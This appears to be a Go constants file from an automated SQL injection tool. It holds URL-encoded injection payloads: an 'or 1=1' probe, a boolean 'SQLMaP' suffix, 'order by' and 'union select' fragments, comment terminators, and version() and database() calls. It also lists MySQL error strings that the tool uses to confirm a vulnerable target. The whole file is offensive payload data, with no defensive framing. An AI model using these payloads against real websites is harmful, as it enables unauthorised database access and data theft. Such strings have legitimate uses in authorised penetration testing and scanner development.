package constant

const (
	DetectWafPayload = "'%20or%201=1--+"
	DetectedKeyword  = "You have an error in your SQL syntax"
	OrderKeyword     = "Unknown column"
	Annotator        = "--+"
	Space            = "%20"
	VersionFunc      = "version()"
	DatabaseFunc     = "database()"
)

const (
	ErrorBasedSuffixPayload  = "%20AnD%20'SQLMaP'='SQLMaP'%20--+"
	ErrorBasedOrderPayload   = "order%20by"
	ErrorBasedUnionCondition = "0"
	ErrorBasedUnionSelect    = "union%20select"
)
